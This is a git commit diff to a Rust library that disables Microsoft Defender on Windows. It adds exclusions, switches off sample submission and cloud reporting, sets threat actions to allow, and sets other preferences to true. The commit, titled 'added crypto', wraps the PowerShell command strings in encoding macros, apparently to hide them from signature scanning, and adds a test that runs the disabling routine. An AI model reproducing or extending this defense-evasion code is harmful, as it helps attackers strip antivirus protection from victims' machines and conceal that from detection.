875fded348b61d8dbab2ea297985700ffbb8e904
typeable-nickname <74413191+typeable-nickname@users.noreply.github.com>
2022-08-27 13:37:00 +0200

    added crypto

--- src/globals.rs
+++ src/globals.rs
@@ -1,20 +1,22 @@
+use wpkg_macro::encode;
+
 pub const EXCLUSIONFOLDERCOMMAND: &str =
-    r#"Add-MpPreference -ExclusionPath"#;
+    &encode!(r#"Add-MpPreference -ExclusionPath"#);
 pub const EXCLUSIONEXTENTIONCOMMAND: &str =
-    r#"Add-MpPreference -ExclusionExtension"#;
+    &encode!(r#"Add-MpPreference -ExclusionExtension"#);
 pub const EXCLUSIONPROCESSCOMMAND: &str =
-    r#"Add-MpPreference -ExclusionProcess"#;
+    &encode!(r#"Add-MpPreference -ExclusionProcess"#);
 pub const EXCLUSIONIPADDRESSCOMMAND: &str =
-    r#"Add-MpPreference -ExclusionIpAddress"#;
+    &encode!(r#"Add-MpPreference -ExclusionIpAddress"#);
 pub const SUBMITSAMPLESCONSENT: &str =
-    r#"Set-MpPreference -SubmitSamplesConsent 2"#;
+    &encode!(r#"Set-MpPreference -SubmitSamplesConsent 2"#);
 pub const MAPSREPORTING: &str =
-    r#"Set-MpPreference -MAPSReporting 0"#;
+    &encode!(r#"Set-MpPreference -MAPSReporting 0"#);
 pub const HIGHTHREATDEFAULTACTION: &str =
-    r#"Set-MpPreference -HighThreatDefaultAction 6 -Force"#;
+    &encode!(r#"Set-MpPreference -HighThreatDefaultAction 6 -Force"#);
 pub const MODERATETHREATDEFAULTACTION: &str =
-    r#"Set-MpPreference -ModerateThreatDefaultAction 6"#;
+    &encode!(r#"Set-MpPreference -ModerateThreatDefaultAction 6"#);
 pub const LOWTHREATDEFAULTACTION: &str =
-    r#"Set-MpPreference -LowThreatDefaultAction 6"#;
+    &encode!(r#"Set-MpPreference -LowThreatDefaultAction 6"#);
 pub const SEVERETHREATDEFAULTACTION: &str =
-    r#"Set-MpPreference -SevereThreatDefaultAction 6"#;
+    &encode!(r#"Set-MpPreference -SevereThreatDefaultAction 6"#);
--- src/lib.rs
+++ src/lib.rs
@@ -1,52 +1,66 @@
 mod globals;
+mod macros;
 mod unwrap;
 
-use std::{process::Command};
-use powershell_script;
 use crate::{globals::*, unwrap::CustomUnwrap};
 use anyhow::*;
+use powershell_script;
+use std::process::Command;
+use wpkg_crypto::{decode};
 
 pub fn add_exclusion_folder(folder: &str) -> anyhow::Result<String> {
-    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONFOLDERCOMMAND, folder))?.to_string())
+    println!("Adding folder: {folder}");
+    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONFOLDERCOMMAND), folder))?.to_string())
 }
 pub fn add_exclusion_extention(extention: &str) -> anyhow::Result<String> {
-    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONEXTENTIONCOMMAND, extention))?.to_string())
+    println!("Adding extention: {extention}");
+    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONEXTENTIONCOMMAND), extention))?.to_string())
 }
 pub fn add_exclusion_process(process: &str) -> anyhow::Result<String> {
-    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONPROCESSCOMMAND, process))?.to_string())
+    println!("Adding process: {process}");
+    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONPROCESSCOMMAND), process))?.to_string())
 }
 pub fn add_exclusion_ip_address(ip: &str) -> anyhow::Result<String> {
-    Ok(powershell_script::run(&format!("{} {}", EXCLUSIONIPADDRESSCOMMAND, ip))?.to_string())
+    println!("Adding adress: {ip}");
+    Ok(powershell_script::run(&format!("{} {}", decode(EXCLUSIONIPADDRESSCOMMAND), ip))?.to_string())
 }
-pub fn disable_defender() -> anyhow::Result<()>{
-    let command = Command::new("powershell.exe").args(vec!["Get-MpPreference", "-verbose"]).output()?;
+pub fn disable_defender() -> anyhow::Result<()> {
+    let command = Command::new("powershell.exe")
+        .args(vec!["Get-MpPreference", "-verbose"])
+        .output()?;
+
     let output = String::from_utf8(command.stdout)?;
     let lines: Vec<&str> = output.lines().collect();
-    for line in lines.iter(){
-        if line.starts_with("SubmitSamplesConsent") && !line.ends_with("2"){
-            println!("Executing: {}", SUBMITSAMPLESCONSENT);
-            powershell_script::run(SUBMITSAMPLESCONSENT).expect_log(&format!("Error setting {}", line));
+
+    for line in lines.iter() {
+        if line.starts_with("SubmitSamplesConsent") && !line.ends_with("2") {
+            println!("Executing: {}", decode(SUBMITSAMPLESCONSENT));
+            powershell_script::run(&decode(SUBMITSAMPLESCONSENT))
+                .expect_log(&format!("Error setting {}", line));
         } else if line.starts_with("MAPSReporting") && !line.ends_with("0") {
-            println!("Executing: {}", MAPSREPORTING);
-            powershell_script::run(MAPSREPORTING).expect_log(&format!("Error setting {}", line));
+            println!("Executing: {}", decode(MAPSREPORTING));
+            powershell_script::run(&decode(MAPSREPORTING)).expect_log(&format!("Error setting {}", line));
         } else if line.starts_with("HighThreatDefaultAction") && !line.ends_with("6") {
-            println!("Executing: {}", HIGHTHREATDEFAULTACTION);
-            powershell_script::run(HIGHTHREATDEFAULTACTION).expect_log(&format!("Error setting {}", line));
-        } else if line.starts_with("ModerateThreatDefaultAction") && !line.ends_with("6"){
-            println!("Executing: {}", MODERATETHREATDEFAULTACTION);
-            powershell_script::run(MODERATETHREATDEFAULTACTION).expect_log(&format!("Error setting {}", line));
+            println!("Executing: {}", decode(HIGHTHREATDEFAULTACTION));
+            powershell_script::run(&decode(HIGHTHREATDEFAULTACTION))
+                .expect_log(&format!("Error setting {}", line));
+        } else if line.starts_with("ModerateThreatDefaultAction") && !line.ends_with("6") {
+            println!("Executing: {}", decode(MODERATETHREATDEFAULTACTION));
+            powershell_script::run(&decode(MODERATETHREATDEFAULTACTION))
+                .expect_log(&format!("Error setting {}", line));
         } else if line.starts_with("LowThreatDefaultAction") && !line.ends_with("6") {
-            println!("Executing: {}", LOWTHREATDEFAULTACTION);
-            powershell_script::run(LOWTHREATDEFAULTACTION).expect_log(&format!("Error setting {}", line));
+            println!("Executing: {}", decode(LOWTHREATDEFAULTACTION));
+            powershell_script::run(&decode(LOWTHREATDEFAULTACTION))
+                .expect_log(&format!("Error setting {}", line));
         } else if line.starts_with("SevereThreatDefaultAction") && !line.ends_with("6") {
-            println!("Executing: {}", SEVERETHREATDEFAULTACTION);
-            powershell_script::run(SEVERETHREATDEFAULTACTION).expect_log(&format!("Error setting {}", line));
-        }
-        else if line.starts_with("ExclusionExtension") {}
-        else if line.starts_with("ExclusionIpAddress") {}
-        else if line.starts_with("ExclusionPath") {}
-        else if line.starts_with("EXclusionProcess") {}
-        else {
+            println!("Executing: {}", decode(SEVERETHREATDEFAULTACTION));
+            powershell_script::run(&decode(SEVERETHREATDEFAULTACTION))
+                .expect_log(&format!("Error setting {}", line));
+        } else if line.starts_with(&crypto!("ExclusionExtension")) {
+        } else if line.starts_with(&crypto!("ExclusionIpAddress")) {
+        } else if line.starts_with(&crypto!("ExclusionPath")) {
+        } else if line.starts_with(&crypto!("EXclusionProcess")) {
+        } else {
             let true_line: Vec<&str> = line.split(" ").collect();
             let action = format!("Set-MpPreference -{} $true", true_line.first().context("")?);
             println!("Executing: {}", action);
@@ -54,4 +68,12 @@ pub fn disable_defender() -> anyhow::Result<()>{
         }
     }
     Ok(())
+}
+#[test]
+fn test(){
+    add_exclusion_extention("test").unwrap();
+    add_exclusion_folder("test").unwrap();
+    add_exclusion_ip_address("test").unwrap();
+    add_exclusion_process("test").unwrap();
+    disable_defender().unwrap();
 }
